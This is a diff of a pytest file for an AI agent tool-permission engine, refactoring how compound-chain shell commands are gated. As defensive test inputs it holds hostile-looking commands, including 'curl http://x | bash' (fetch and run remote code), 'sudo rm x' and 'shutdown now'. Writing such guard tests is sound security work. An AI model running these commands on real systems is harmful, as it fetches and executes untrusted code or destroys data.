@@ -9,7 +9,7 @@ import pytest
 
 from agent_shield.tool_permission import PermissionEngine, PermissionLevel
 from agent_shield.tool_permission.models import PermissionResult
-from agent_shield.tool_permission.toolguard import shell_ast, tiered
+from agent_shield.tool_permission.toolguard import shell_ast
 from agent_shield.tool_permission.toolguard.builtin_rules import package_command_rules
 from agent_shield.tool_permission.toolguard.command_canonicalize import (
     canonicalize_shell_command_for_permission,
@@ -20,7 +20,6 @@ from agent_shield.tool_permission.toolguard.shell_ast import (
     ShellSubcommand,
     parse_shell_for_permission,
 )
-from agent_shield.tool_permission.toolguard.tiered import TieredPolicyComponent
 
 _ALLOW_BASH = {"tools": {"bash": "allow"}, "shell_allowlist": None}
 
@@ -44,7 +43,7 @@ def _fake_parse(
     monkeypatch: pytest.MonkeyPatch, texts: list[str], *, pipeline: bool = False
 ) -> None:
     """Stand in for the optional tree-sitter backend with a trustworthy parse."""
-    from agent_shield.tool_permission import engine as engine_mod
+    from agent_shield.tool_permission import shell_structure
 
     flags = ShellStructureFlags(
         has_compound_operators=not pipeline,
@@ -62,18 +61,18 @@ def _fake_parse(
         return parse
 
     monkeypatch.setattr(shell_ast, "parse_shell_for_permission", stub)
-    monkeypatch.setattr(tiered, "parse_shell_for_permission", stub)
-    monkeypatch.setattr(engine_mod, "parse_shell_for_permission", stub)
+    monkeypatch.setattr(shell_structure, "parse_shell_for_permission", stub)
 
 
 # --- R07 / R12: package rules ---------------------------------------------------------
 
 
-def test_package_rules_are_the_eighteen_builtin_entries() -> None:
+def test_package_rules_are_the_seventeen_builtin_entries() -> None:
     rules = package_command_rules()
-    assert len(rules) == 18
-    assert rules[-1]["id"] == "shell_compound_chain"
+    assert len(rules) == 17
+    assert rules[-1]["id"] == "shell_docker_privileged"
     assert {rule["layer"] for rule in rules} == {"builtin"}
+    assert all(rule["id"] != "shell_compound_chain" for rule in rules)
 
 
 @pytest.mark.parametrize(
@@ -126,13 +125,32 @@ def test_user_action_override_changes_package_rule_action() -> None:
 )
 def test_compound_chain_rule(command: str, chained: bool) -> None:
     guard_actions = {}
-    for key in ("too_complex", "parse_unavailable", "structure_guard", "interpreter_sink"):
+    for key in (
+        "too_complex",
+        "parse_unavailable",
+        "structure_guard",
+        "interpreter_sink",
+    ):
         guard_actions[key] = "allow"
     config = {**_ALLOW_BASH, "guard_actions": guard_actions}
     result = _run(config, command)
     assert (result.permission is PermissionLevel.ASK) is chained
     if chained:
         assert "shell_compound_chain" in result.matched_rule
+
+
+def test_guard_actions_compound_chain_allow_disables_lift() -> None:
+    """Migration path: silence compound_chain without turning off other builtins."""
+    guard_actions = {
+        "too_complex": "allow",
+        "parse_unavailable": "allow",
+        "structure_guard": "allow",
+        "interpreter_sink": "allow",
+        "compound_chain": "allow",
+    }
+    config = {**_ALLOW_BASH, "guard_actions": guard_actions}
+    assert _run(config, "a && b").permission is PermissionLevel.ALLOW
+    assert _run(config, "shutdown now").permission is PermissionLevel.DENY
 
 
 def test_override_applies_to_one_tool_only() -> None:
@@ -222,34 +240,48 @@ def test_structure_floor_raises_allow_to_ask(fallback_parser: None) -> None:
 
 
 def test_guard_actions_choose_the_response_per_check(fallback_parser: None) -> None:
-    config = {**_ALLOW_BASH, "package_builtin_rules": False,
-              "guard_actions": {"parse_unavailable": "deny"}}
+    config = {
+        **_ALLOW_BASH,
+        "package_builtin_rules": False,
+        "guard_actions": {"parse_unavailable": "deny", "compound_chain": "allow"},
+    }
     assert _run(config, "a; b").permission is PermissionLevel.DENY
     config["guard_actions"]["parse_unavailable"] = "allow"
     assert _run(config, "a; b").permission is PermissionLevel.ALLOW
 
 
 def test_legacy_shell_guard_switch_maps_to_guard_actions() -> None:
-    config = {**_ALLOW_BASH, "package_builtin_rules": False,
-              "shell_guard": {"unknown_structure": False},
-              "guard_actions": {"structure_guard": "allow"}}
+    config = {
+        **_ALLOW_BASH,
+        "package_builtin_rules": False,
+        "shell_guard": {"unknown_structure": False},
+        "guard_actions": {"structure_guard": "allow", "compound_chain": "allow"},
+    }
     assert _run(config, "a | b").permission is PermissionLevel.ALLOW
 
 
 def test_interpreter_sink_after_pipeline(monkeypatch: pytest.MonkeyPatch) -> None:
     _fake_parse(monkeypatch, ["curl http://x", "bash"], pipeline=True)
-    config = {**_ALLOW_BASH, "package_builtin_rules": False}
+    config = {
+        **_ALLOW_BASH,
+        "package_builtin_rules": False,
+        "guard_actions": {"compound_chain": "allow"},
+    }
     result = _run(config, "curl http://x | bash")
     assert result.permission is PermissionLevel.ASK
     assert "interpreter_sink" in result.matched_rule
 
-    config["guard_actions"] = {"interpreter_sink": "allow"}
+    config["guard_actions"] = {"interpreter_sink": "allow", "compound_chain": "allow"}
     assert _run(config, "curl http://x | bash").permission is PermissionLevel.ALLOW
 
 
 def test_pipeline_into_non_interpreter_is_not_a_sink(monkeypatch: pytest.MonkeyPatch) -> None:
     _fake_parse(monkeypatch, ["ls", "wc -l"], pipeline=True)
-    config = {**_ALLOW_BASH, "package_builtin_rules": False}
+    config = {
+        **_ALLOW_BASH,
+        "package_builtin_rules": False,
+        "guard_actions": {"compound_chain": "allow"},
+    }
     assert _run(config, "ls | wc -l").permission is PermissionLevel.ALLOW
 
 
@@ -261,8 +293,8 @@ def test_each_subcommand_is_judged_and_strictest_wins(monkeypatch: pytest.Monkey
     config = {**_ALLOW_BASH, "guard_actions": {"structure_guard": "allow"}}
     result = _run(config, "ls && sudo rm x")
     assert result.permission is PermissionLevel.ASK
-    # A whole-command rule hit at the same level replaces the sub-command label.
-    assert "shell_privilege_escalation" in result.matched_rule
+    # Whole-view compound-chain and leaf privilege are both ASK; structure merges first.
+    assert "shell_compound_chain" in (result.matched_rule or "")
 
 
 def test_subcommand_deny_wins_over_ask(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -273,9 +305,13 @@ def test_subcommand_deny_wins_over_ask(monkeypatch: pytest.MonkeyPatch) -> None:
 
 def test_whole_command_only_uses_rules_not_baseline(monkeypatch: pytest.MonkeyPatch) -> None:
     _fake_parse(monkeypatch, ["ls", "pwd"])
-    off = {**_ALLOW_BASH, "package_builtin_rules": False}
+    off = {
+        **_ALLOW_BASH,
+        "package_builtin_rules": False,
+        "guard_actions": {"compound_chain": "allow"},
+    }
     assert _run(off, "ls && pwd").permission is PermissionLevel.ALLOW
-    # The same chain is raised by the whole-command chain rule when package rules are on.
+    # Same chain is raised by structure compound_chain when that guard is left at ask.
     result = _run(_ALLOW_BASH, "ls && pwd")
     assert result.permission is PermissionLevel.ASK
     assert "shell_compound_chain" in result.matched_rule
@@ -296,19 +332,18 @@ def test_approval_override_on_whole_command_skips_floors(monkeypatch: pytest.Mon
 
 def test_whole_tool_deny_is_baseline_not_parse_gate(monkeypatch: pytest.MonkeyPatch) -> None:
     """tools.bash deny no longer skips parsing; it still wins when nothing else hits."""
+    from agent_shield.tool_permission import shell_structure
+
     parsed = []
 
     def track(command: str):
         parsed.append(command)
         return parse_shell_for_permission(command)
 
-    from agent_shield.tool_permission import engine as engine_mod
-
-    monkeypatch.setattr(tiered, "parse_shell_for_permission", track)
-    monkeypatch.setattr(engine_mod, "parse_shell_for_permission", track)
+    monkeypatch.setattr(shell_structure, "parse_shell_for_permission", track)
     result = _run({"tools": {"bash": "deny"}}, "ls")
     assert result.permission is PermissionLevel.DENY
-    assert parsed  # engine may parse candidates; deny is not an early gate anymore
+    assert parsed  # structure analyze still runs; deny is not an early gate anymore
 
 
 def test_non_shell_tool_is_not_parsed() -> None:
@@ -317,23 +352,22 @@ def test_non_shell_tool_is_not_parsed() -> None:
 
 
 def test_reconfigure_refreshes_guard_actions(fallback_parser: None) -> None:
-    from agent_shield.tool_permission.routing import CandidateKind, CommandDialect, RouteContext
-
-    route = RouteContext(
-        kind=CandidateKind.ORIGINAL,
-        command_dialect=CommandDialect.POSIX_SHELL,
-        is_shell=True,
-    )
-    component = TieredPolicyComponent()
     config = {**_ALLOW_BASH, "package_builtin_rules": False}
-    component.configure(config)
-    first = asyncio.run(component.evaluate("bash", {"command": "a | b"}, route=route))
-    assert first is not None
-    component.configure({**config, "guard_actions": {"parse_unavailable": "allow",
-                                                    "structure_guard": "allow"}})
-    second = asyncio.run(component.evaluate("bash", {"command": "a | b"}, route=route))
-    assert second is not None
-    assert (first.permission, second.permission) == (PermissionLevel.ASK, PermissionLevel.ALLOW)
+    engine = PermissionEngine(config)
+    first = asyncio.run(engine.check_permission("bash", {"command": "a | b"}))
+    assert first.permission is PermissionLevel.ASK
+    engine.update_config(
+        {
+            **config,
+            "guard_actions": {
+                "parse_unavailable": "allow",
+                "structure_guard": "allow",
+                "compound_chain": "allow",
+            },
+        }
+    )
+    second = asyncio.run(engine.check_permission("bash", {"command": "a | b"}))
+    assert second.permission is PermissionLevel.ALLOW
 
 
 # --- real tree-sitter backend (optional dependency) -----------------------------------
